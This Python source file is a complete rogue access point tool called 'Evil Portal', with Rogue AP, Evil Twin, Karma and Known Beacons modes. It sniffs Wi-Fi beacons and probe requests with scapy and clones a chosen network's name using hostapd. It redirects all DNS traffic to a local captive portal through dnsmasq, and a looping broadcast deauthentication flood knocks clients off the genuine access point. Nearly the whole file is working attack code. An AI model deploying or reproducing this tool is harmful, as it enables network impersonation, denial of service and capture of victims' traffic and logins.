import os, re, time, signal, threading
from scapy.all import *

phpVersion = 7.3
tempFolder = '/tmp/evilportal'

def title():
    ret = '\n'
    ret += '███████╗██╗   ██╗██╗██╗     \n'
    ret += '██╔════╝██║   ██║██║██║     \n'
    ret += '█████╗  ██║   ██║██║██║     \n'
    ret += '██╔══╝  ╚██╗ ██╔╝██║██║     \n'
    ret += '███████╗ ╚████╔╝ ██║███████╗\n'
    ret += '╚══════╝  ╚═══╝  ╚═╝╚══════╝\n'
    ret += '██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗     \n'
    ret += '██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     \n'
    ret += '██████╔╝██║   ██║██████╔╝   ██║   ███████║██║     \n'
    ret += '██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║     \n'
    ret += '██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗\n'
    ret += '╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝\n'
    ret += '                           By: hacefresko         \n'

    return ret

class networkInterfaces:

    # Here we find directories representing current network interfaces named after them
    netIntDir = '/sys/class/net'
    
    hostapdLogFile = 'hostapd.log'
    dnsmasqLogFile = 'dnsmasq.log'

    knownOpenWifis = 'known-open-wlans.txt'
    probedFile = 'probedSSIDs.txt'

    def __init__(self):
        self.interfaces = []

        for dirpath, interfaces, filenames in os.walk(self.netIntDir):
            for interface in interfaces:
                if re.match(r'wl\w+', interface):
                    # Directory /sys/class/net/<interface>/type contains 
                    # the mode in which the interface is operating:
                    #   1   -> managed
                    #   803 -> monitor
                    #
                    f = open(self.netIntDir + '/' + interface + '/type', 'r')
                    if f.read() == '803\n':
                        self.interfaces.append({'name' : interface, 'mode' : 'monitor', 'channel' : 0})
                    else:
                        self.interfaces.append({'name' : interface, 'mode' : 'managed', 'channel' : 0})
                    f.close()

    def __repr__(self):
        ret = '\nNETWORK INTERFACES\n\n'

        i = 1
        for interface in self.interfaces:
            if interface['mode'] == 'monitor':
                ret += '[{}] -> {} ({})\n'.format(i, interface['name'], interface['mode'])
            else:
                ret += '[{}] -> {}\n'.format(i, interface['name'])
            i = i + 1
            
        return ret

    def getMode(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']
        
        f = open(self.netIntDir + '/' + interface + '/type', 'r')
        if f.read() == '803\n':
            ret = 'monitor'
        else:
            ret = 'managed'

        return ret

    def putInMonitor(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]

        if interface['mode'] == 'monitor':
            print('[x] Selected interface is already in monitor mode!\n')
            return -1
        
        print('[-] Configuring network interface...')

        os.system('ifconfig ' + interface['name'] + ' down')
        os.system('iw ' + interface['name'] + ' set type monitor')
        os.system('ifconfig ' + interface['name'] + ' up')

        # Set channel to 1 for later scanning
        os.system('iw ' + interface['name'] + ' set channel 1')
        self.interfaces[nInterface]['channel'] = 1
        self.interfaces[nInterface]['monitor'] = 'monitor'

        # Check if interface is indeed in monitor mode
        if self.getMode(nInterface) != 'monitor':
            print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
            return -1

        print('[+] Network interface configured succesfuly')
        
        return 0

    def changeChannel(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        t = threading.currentThread()
        # We assign stop=False as an attribute of the current thread. This is used to stop the loop from other thread
        while not getattr(t, 'stop', False):
            channel = self.interfaces[nInterface]['channel']
            channel = channel + 1
            if channel > 13:
                channel = 1
            self.interfaces[nInterface]['channel'] = channel

            os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel ' + str(channel))
            time.sleep(0.5)

        os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel 1')
        self.interfaces[nInterface]['channel'] = 1

    def sniffAccessPoints(self, nInterface, sigint_handler):
        accessPoints = []

        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        # stop is defined as global for the sigint handler to be able to get it
        global stop
        stop = False

        def sigint_handler_probe(sig, frame):
            global stop
            stop = True
            signal.signal(signal.SIGINT, sigint_handler)
        
        signal.signal(signal.SIGINT, sigint_handler_probe)

        changeChThread = threading.Thread(target = self.changeChannel, args = (nInterface,))
        changeChThread.start()

        print('WIFI ACCESS POINTS (Ctrl C to stop)')
        print('+---+-------------------+------+------------------+')
        print('| i |       BSSID       | ENCR |       SSID       |')
        print('+---+-------------------+------+------------------+')

        def sniffAP_callback(pkt):
            # Protocol 802.11, type management, subtype beacon
            if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
                # Address 2 is source address (in this case dest is broadcast FF:FF:FF:FF:FF:FF)
                # upper() prints all letters to capital letters
                bssid = pkt[Dot11].addr2.upper()
                ssid = pkt.info.decode('UTF-8')
                channel = pkt[Dot11Beacon].network_stats().get('channel')
                encryption = pkt[Dot11Beacon].network_stats().get('crypto').pop()
                
                newAccessPoint = {'bssid' : bssid, 'ssid' : ssid, 'channel' : str(channel), 'encryption' : encryption}
                if ssid and newAccessPoint not in accessPoints:
                    accessPoints.append(newAccessPoint)
                    if encryption == 'WPA2/PSK':
                        encr = 'WPA2'
                    elif encryption == 'WPA/PSK':
                        encr = 'WPA'
                    else:
                        encr = encryption
                        
                    print('|%3s| %17s | %4.4s | %-16.16s |' % (str(len(accessPoints)), bssid, encryption, ssid))       

        sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
        sniffer.start()

        while not stop:
            pass

        changeChThread.stop = True
        sniffer.stop()
        print('--+-------------------+------+------------------+')

        accessPoint = -1
        while accessPoint < 0 or accessPoint >= len(accessPoints):
            accessPoint = int(input('Select access point to mirror > ')) - 1

            if accessPoint < 0 or accessPoint >= len(accessPoints):
                print('[x] Input out of bounds!')
            else:
                return accessPoints[accessPoint]
        print('\n')

    def sniffClientsInAccessPoints(self, nInterface, sigint_handler):
        accessPointsWOClients = {}
        accessPoints = []

        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        # stop is defined as global for the sigint handler to be able to get it
        global stop
        stop = False

        def sigint_handler_probe(sig, frame):
            global stop
            stop = True
            signal.signal(signal.SIGINT, sigint_handler)
        
        signal.signal(signal.SIGINT, sigint_handler_probe)

        changeChThread = threading.Thread(target = self.changeChannel, args = (nInterface,))
        changeChThread.start()

        print('WIFI ACCESS POINTS AND CLIENTS (Ctrl C to stop)')
        print('+---+------------------+------+-------------------+')
        print('| i |       SSID       | ENCR |       CLIENT      |')
        print('+---+------------------+------+-------------------+')

        def sniffAP_callback(pkt):
            # Protocol 802.11, type management, subtype beacon
            if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
                # Address 2 is source address (in this case dest is broadcast FF:FF:FF:FF:FF:FF)
                # upper() prints all letters to capital letters
                bssid = pkt[Dot11].addr2.upper()
                ssid = pkt.info.decode('UTF-8')
                channel = pkt[Dot11Beacon].network_stats().get('channel')
                encryption = pkt[Dot11Beacon].network_stats().get('crypto').pop()
                
                newAccessPoint = {'ssid' : ssid, 'channel' : str(channel), 'encryption' : encryption}
                if ssid and bssid not in accessPointsWOClients:
                    accessPointsWOClients[bssid] = newAccessPoint

            # Protocol 802.11, type data
            elif pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
                bssid = pkt[Dot11].addr2.upper()
                client = pkt[Dot11].addr1.upper()
                if bssid in accessPointsWOClients:
                    newAccessPoint = {'bssid' : bssid , 'ssid' : accessPointsWOClients[bssid]['ssid'], 'channel' : accessPointsWOClients[bssid]['channel'], 'encryption' : accessPointsWOClients[bssid]['encryption'], 'client' : client}
                    accessPoints.append(newAccessPoint)
                    encryption = accessPoints[len(accessPoints) - 1]['encryption']
                    if encryption == 'WPA2/PSK':
                        encr = 'WPA2'
                    elif encryption == 'WPA/PSK':
                        encr = 'WPA'
                    else:
                        encr = encryption
                    print('|%3s| %-16.16s | %4.4s | %17s |' % (str(len(accessPoints)), accessPoints[len(accessPoints) - 1]['ssid'], encr, client))

        sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
        sniffer.start()

        while not stop:
            pass

        changeChThread.stop = True
        sniffer.stop()
        print('--+------------------+------+-------------------+')

        accessPoint = -1
        while accessPoint < 0 or accessPoint >= len(accessPoints):
            accessPoint = int(input('Select access point to mirror > ')) - 1

            if accessPoint < 0 or accessPoint >= len(accessPoints):
                print('[x] Input out of bounds!')
            else:
                return accessPoints[accessPoint]
        print('\n')

    def sniffProbeReq(self, nInterface, sigint_handler):
        probeRequests = []

        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        # stop is defined as global for the sigint handler to be able to get it
        global stop
        stop = False

        def sigint_handler_probe(sig, frame):
            global stop
            stop = True
            signal.signal(signal.SIGINT, sigint_handler)
        
        signal.signal(signal.SIGINT, sigint_handler_probe)

        changeChThread = threading.Thread(target = self.changeChannel, args = (nInterface,))
        changeChThread.start()

        print('PROBE REQUESTS (Ctrl C to stop)')
        print('\n           CLIENT            SSID')
        print('     -----------------    ----------')

        def sniffAP_callback(pkt):
            # Protocol 802.11, type management, subtype probe request
            if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4:
                client = pkt[Dot11].addr2.upper()
                ssid = pkt.info.decode('UTF-8')
                
                newProbeRequest = {'client' : client, 'ssid' : ssid} 
                if ssid and newProbeRequest not in probeRequests:
                    probeRequests.append(newProbeRequest)
                    print('[%2s] %17s -> %-24.24s' % (str(len(probeRequests)), client, ssid))       

        sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
        sniffer.start()

        while not stop:
            pass

        changeChThread.stop = True
        sniffer.stop()
        
        probeRequest = -1
        while probeRequest < 0 or probeRequest >= len(probeRequests):
            probeRequest = int(input('\nSelect probe request to mirror > ')) - 1

            if probeRequest < 0 or probeRequest >= len(probeRequests):
                print('[x] Input out of bounds!')
            else:
                return probeRequests[probeRequest]

    def sniffKnownOpenWifis(self, nInterface, sigint_handler):
        numBeacons = 200

        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        global stop
        stop = False

        def sigint_handler_probe(sig, frame):
            print('\n[+] SIGINT: killing sender...')
            global stop
            stop = True
            signal.signal(signal.SIGINT, sigint_handler)
        
        signal.signal(signal.SIGINT, sigint_handler_probe)

        interface = self.interfaces[nInterface]['name']
        bssid = '16:91:82:18:79:B2' # Fake bssid (random)
        beaconSSID = previousSSID = ''
        probedFD = open(self.probedFile, 'a')
        probed = []

        # Sniff probe requests
        def sniffAP_callback(pkt):
            # Protocol 802.11, type management, subtype probe request
            if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4 and not stop:
                ssid = pkt.info.decode('UTF-8')
                
                if ssid and (ssid == beaconSSID or ssid == previousSSID):
                    client = pkt[Dot11].addr2.upper()
                    print('[+] Client ' + client + ' responded to ' + ssid)
                    if ssid not in probed:
                        probedFD.write(ssid + ' (' + client + ')\n')
                        probed.append(ssid)

        sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
        sniffer.start()
        
        # Send beacon frames
        f = open(os.path.join(self.knownOpenWifis))
        while f and not stop:
            beaconSSID = f.readline().split('\n')[0]

            print('[-] Sending ' + str(numBeacons) + ' beacon frames with ssid ' + beaconSSID)

            # Type management, subtype beacon
            beaconFrame = RadioTap()/Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid)/Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info=beaconSSID, len=len(beaconSSID))

            # Beacon interval = 100TU (1TU = 1024us)
            sendp(beaconFrame, iface=interface, count = numBeacons, inter=0.1024,verbose = 0)
            previousSSID = beaconSSID

        f.close()
        probedFD.close()
        sniffer.stop()

        print('\nPROBED SSIDs')
        i=1
        for ssid in probed:
            print('[' + str(i) + '] -> ' + ssid)
            i = i + 1

        ssid = -1
        while ssid < 0 or ssid >= len(probed):
            ssid = int(input('\nSelect probed SSID > ')) - 1

            if ssid < 0 or ssid >= len(probed):
                print('[x] Input out of bounds!')
            else:
                print()
                return probed[ssid]

    def launchHostapd(self, nInterface, ssid, channel, encryption):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']
        
        # Hostapd configuration
        print('[-] Configuring hostapd...')
        hostapdConfigFile = 'hostapd.conf'
        hostapdConfig = ''

        hostapdConfig += 'interface=' + interface + '\n'        # Interface used
        hostapdConfig += 'driver=nl80211\n'                     # Driver interface typr
        hostapdConfig += 'ssid=' + ssid + '\n'                  # SSID
        hostapdConfig += 'hw_mode=g\n'                          # Hardware mode (802.11g)
        hostapdConfig += 'channel=' + channel + '\n'            # Channel
        hostapdConfig += 'macaddr_acl=0\n'                      # Station MAC address -based auth (0 = accept unless in deny list)
        hostapdConfig += 'ignore_broadcast_ssid=0\n'            # Require stations to know SSID to connect (ignore probe requests without full SSID)

        if encryption == 'OPN':
            hostapdConfig += 'auth_algs=1\n'                    # Authenticatin algorithm (bit 0 = Open System Auth)

        elif encryption == 'WPA/PSK':
            password = input('\nWifi password [more than 8 chars]> ')
            print()

            hostapdConfig += 'wpa=1\n'                          # Enable WPA
            hostapdConfig += 'wpa_passphrase=' + password + '\n'# WPA pre-shared key (WiFi password)
            hostapdConfig += 'wpa_key_mgmt=WPA-PSK\n'           # Accepted key management algorithms
            hostapdConfig += 'wpa_pairwise=TKIP CCMP\n'         # Pairwsie cipher for WPA (Temporal Key Integrity Protocl) 
            hostapdConfig += 'auth_algs=3\n'                    # Authenticatin algorithm (bit 2 = Shared Key Auth)

        elif encryption == 'WPA2/PSK':
            password = input('\nWifi password [more than 8 chars]> ')
            print()

            hostapdConfig += 'wpa=2\n'                          # Enable WPA2
            hostapdConfig += 'wpa_passphrase=' + password + '\n'# WPA pre-shared key (WiFi password)
            hostapdConfig += 'wpa_key_mgmt=WPA-PSK\n'           # Accepted key management algorithms
            hostapdConfig += 'wpa_pairwise=TKIP\n'              # Pairwsie cipher for WPA (Temporal Key Integrity Protocl) 
            hostapdConfig += 'rsn_pairwise=CCMP\n'              # Pairwise cipher for RSN/WPA2 (AES-CBC)
            hostapdConfig += 'auth_algs=3\n'                    # Authenticatin algorithm (bit 2 = Shared Key Auth)

        f = open(os.path.join(tempFolder, hostapdConfigFile), 'w')
        f.write(hostapdConfig)
        f.close()

        # Hostapd initialization
        os.system('hostapd ' + os.path.join(tempFolder, hostapdConfigFile) + ' > ' + os.path.join(tempFolder, self.hostapdLogFile) + ' &')
        print('[+] hostapd succesfuly configured')
        
        return 0

    def launchDnsmasq(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']

        # Stop dnsmasq daemon in case it's active
        os.system('service dnsmasq stop')

        # Flush iptables to avoid conflicts
        print ('[-] Flushing iptables...')
        os.system('iptables -F')
        os.system('iptables -t nat -F')
        print('[+] Iptables flushed')

        # Config dnsmasq
        dnsmasqHostsFile = 'hosts'
        dnsmasqConfigFile = 'dnsmasq.conf'
        dnsmasqConfig = ''

        print('[-] Configuring dnsmasq...')

        dnsmasqConfig += 'interface=' + interface + '\n'                        # Interface in which dnsmasq listen
        dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
        dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'                             # Set router to 10.0.0.1
        dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'                             # Set dns server to 10.0.0.1
        dnsmasqConfig += 'log-queries\n'                                        # Log all queries
        dnsmasqConfig += 'address=/#/10.0.0.1\n'                                # Response to every DNS query with 10.0.0.1 (where our captive portal is)
        dnsmasqConfig += 'address=/www.google.com/216.58.209.68\n'              # Samsung devices check if www.google.com is available apart from checking if connectivitycheck.gstatic.com/generate_204 responds with a redirection

        f = open(os.path.join(tempFolder, dnsmasqConfigFile), 'w')
        f.write(dnsmasqConfig)
        f.close

        # Configures dnsmasq to assign the interface ip to the domain name so 
        # mod_rewrite  from .htaccess can reffer directly to the domain name in the URL
        f = open(os.path.join(tempFolder, dnsmasqHostsFile), 'w')
        f.write('10.0.0.1 wifiportal2.aire.es')
        f.close()

        # Set inet address of interface to 10.0.0.1
        os.system('ifconfig ' + interface + ' 10.0.0.1')

        # Initialize dnsmasq
        os.system('dnsmasq -C ' + os.path.join(tempFolder, dnsmasqConfigFile) + ' -H ' + os.path.join(tempFolder, dnsmasqHostsFile) + ' --log-facility=' + os.path.join(tempFolder, self.dnsmasqLogFile))
        
        if not os.path.isfile(os.path.join(tempFolder, self.dnsmasqLogFile)):
            print('[x] dnsmasq couldn\'t be configured!')
            return -1

        print('[+] dnsmasq succesfuly configured')

        return 0

    def deauth(self, nInterface, channel, bssid):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        if self.getMode(nInterface) != 'monitor':
            print('[x] Selected interface is not in monitor mode! (' + self.interfaces[nInterface]['name'] + ')\n')
            return -1

        # Change channel
        os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel ' + channel)
        
        # Craft packet
        broadcast = 'FF:FF:FF:FF:FF:FF'
        pkt = RadioTap()/Dot11(addr1 = broadcast, addr2 = bssid, addr3 = bssid)/Dot11Deauth(reason=1) # Deauth due to unespecified reason

        def sendPkt():
            t = threading.currentThread()
            while not getattr(t, 'stop', False):
                sendp(pkt, iface=self.interfaces[nInterface]['name'], verbose=0)
            print('[+] Deauth stopped\n')

        global deauThread
        deauThread = threading.Thread(target = sendPkt)
        deauThread.start()

        print('[+] Sending deauth packets from ' + bssid + ' to ' + broadcast + ' via channel ' + channel)

def configWebApp():
    # Config captive portal files
    print('[-] Copying web files...')
    os.system('rm -r /var/www/html/* 2>/dev/null')
    os.system('cp -r captive /var/www/html/captive')
    os.system('cp .htaccess /var/www/html')
    os.system('chmod 755 /var/www/html/.htaccess')
    os.system('chmod 755 /var/www/html/captive')
    os.system('chmod 755 /var/www/html/captive/*')
    print('[+] Web files copied succesfuly')

    # Enable rewrite and override for .htaccess and php
    print('[-] Configuring apache2...\n')
    os.system('cp -f override.conf /etc/apache2/conf-available/')
    os.system('a2enconf override')
    os.system('a2enmod rewrite')
    os.system('a2enmod php' + str(phpVersion))

    # Reload/restart apache2 and start mysql (mariaDB)
    os.system('service apache2 reload')
    os.system('service apache2 restart')
    print('\n[+] apache2 configured succesfuly')
    print('[-] Configuring mysql...')
    os.system('service mysql start')
    print('[+] mysql configured succesfuly')

# We define the file descriptors for hostapd log file and dnsmasq log 
# file as global in order for the sigint handler to be able to get them
hostapdFD = 0
dnsmasqFD = 0
deauThread = 0
def sigint_handler(sig, frame):
    print('\n\n[x] SIGINT: Exiting...')
    os.system('pkill hostapd')
    os.system('pkill dnsmasq')

    os.system('rm -r ' + tempFolder + ' 2>/dev/null')

    global hostapdFD
    global dnsmasqFD

    if hostapdFD != 0:
        hostapdFD.close()

    if dnsmasqFD != 0:
        dnsmasqFD.close()

    global deauThread

    if deauThread != 0:
        deauThread.stop = True

    quit()

signal.signal(signal.SIGINT, sigint_handler)

print(title())

# Check for root priviledges
if os.getuid() != 0:
    print('[x] Please, run program as root!\n')
    quit()

networkInterfaces = networkInterfaces()

# Select network interface
if len(networkInterfaces.interfaces) == 0:
    print('[x] No network interface detected!\n')
    quit()

elif len(networkInterfaces.interfaces) == 1:
    interface = 0
    if networkInterfaces.interfaces[interface]['mode'] != 'monitor':
        if networkInterfaces.putInMonitor(interface) != 0:
            print('[x] Network interface couldn\'t be put in monitor mode')
            quit() 

elif len(networkInterfaces.interfaces) > 1:
    ok = -1
    while ok != 0: 
        print(networkInterfaces)
        interface = int(input('Select network interface > ')) - 1
        print()
        if interface < 0 or interface >= len(networkInterfaces.interfaces): 
            print('[x] Input value out of bounds!')
        else:
            if networkInterfaces.interfaces[interface]['mode'] != 'monitor':
                ok = networkInterfaces.putInMonitor(interface)
            else:
                ok = 0

print('[+] Network Interface in use: ' + networkInterfaces.interfaces[interface]['name'])

# Create temp folder
try:
    os.makedirs(tempFolder)
except OSError:
    print('[-] Temporal directory ' + tempFolder + ' already exists')

# Select operating mode
op = -1
while op < 1 or op > 4:
    print('\nOPERATING MODE')
    print('[1] -> Rogue AP')
    print('[2] -> Evil Twin')
    print('[3] -> Karma')
    print('[4] -> Known Beacons')
    op = int(input(' > '))
    print()

    if op == 1:
        ssid = input('WiFi SSID > ')
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = 'OPN'
            elif encr == 2:
                encryption = 'WPA2/PSK'
        print()

        # Launch hostapd
        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

        # Launch dnsmasq
        if networkInterfaces.launchDnsmasq(interface) != 0:
            quit()

        # Config web app
        configWebApp()

    elif op == 2:
        # Select network interface 2
        if len(networkInterfaces.interfaces) == 1:
            print('[x] Not enough network interface detected (2)!\n')
            quit()

        elif len(networkInterfaces.interfaces) == 2:
            if interface == 0:
                interface2 = 1
            else:
                interface2 = 0
            
            if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
                if networkInterfaces.putInMonitor(interface2) != 0:
                    print('[x] Second network interface couldn\'t be put in monitor mode')
                    quit()


        elif len(networkInterfaces.interfaces) > 2:
            ok = -1
            while ok != 0: 
                print(networkInterfaces)
                interface2 = int(input('Select network interface > ')) - 1
                print()
                if interface2 < 0 or interface2 >= len(networkInterfaces.interfaces): 
                    print('[x] Input value out of bounds!')
                elif interface2 == interface:
                    print('[x] ' + networkInterfaces.interfaces[interface]['name'] + ' already in use!')
                else:
                    if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
                        ok = networkInterfaces.putInMonitor(interface2)
                    else:
                        ok = 0

        print('[+] Second network Interface: ' + networkInterfaces.interfaces[interface2]['name'] + '\n')
        
        clients = ''
        while clients != 'Y' and clients != 'N':
            clients = input('Show only APs with clients connected? [Y/N] > ').upper()
            if clients == 'Y':
                print()
                accessPoint = networkInterfaces.sniffClientsInAccessPoints(interface, sigint_handler)
            elif clients == 'N':
                print()
                accessPoint = networkInterfaces.sniffAccessPoints(interface, sigint_handler)
            else:
                print('[x] Select a valid option!')

        bssid = accessPoint['bssid']
        ssid = accessPoint['ssid']
        channel = accessPoint['channel']
        encryption = accessPoint['encryption']

        # Launch hostapd
        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

        # Launch dnsmasq
        if networkInterfaces.launchDnsmasq(interface) != 0:
            quit()

        # Config web app
        configWebApp()

        # Deauth AP
        networkInterfaces.deauth(interface2, channel, bssid)

    elif op == 3:
        probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
        ssid = probeRequest['ssid']
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = 'OPN'
            elif encr == 2:
                encryption = 'WPA2/PSK'
        print()

        # Launch hostapd
        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

        # Launch dnsmasq
        if networkInterfaces.launchDnsmasq(interface) != 0:
            quit()
        # Config web app
        configWebApp()

    elif op == 4:
        ssid = networkInterfaces.sniffKnownOpenWifis(interface, sigint_handler)
        channel = input('Channel > ')
        encryption = 'OPN'

        # Launch hostapd
        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

        # Launch dnsmasq
        if networkInterfaces.launchDnsmasq(interface) != 0:
            quit()

        # Config web app
        configWebApp()

    else:
        print('[x] Input value out of bounds!\n')

# Print hostapd + dnsmasq
hostapdFD = open(os.path.join(tempFolder, networkInterfaces.hostapdLogFile), 'r')
dnsmasqFD = open(os.path.join(tempFolder, networkInterfaces.dnsmasqLogFile), 'r')
prev = ''
while True:
    hostapdLog = hostapdFD.read()
    if hostapdLog:
        if prev != 'hostapd':
            print('\n[HOSTAPD]')
        print(hostapdLog, end = '')
        prev = 'hostapd'

    dnsmasqLog = dnsmasqFD.read()
    if dnsmasqLog:
        if prev != 'dnsmasq':
            print('\n[DNSMASQ]')
        print(dnsmasqLog, end = '')
        prev = 'dnsmasq'

    time.sleep(1)

